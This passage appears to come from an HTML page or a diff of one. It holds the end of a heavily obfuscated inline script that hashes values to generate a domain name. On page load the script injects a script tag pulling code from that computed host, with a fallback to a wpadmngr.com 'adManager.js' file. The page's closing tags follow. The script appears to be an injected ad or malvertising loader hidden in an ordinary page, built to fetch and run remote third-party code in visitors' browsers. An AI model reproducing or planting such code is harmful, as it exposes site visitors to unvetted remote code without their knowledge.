x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
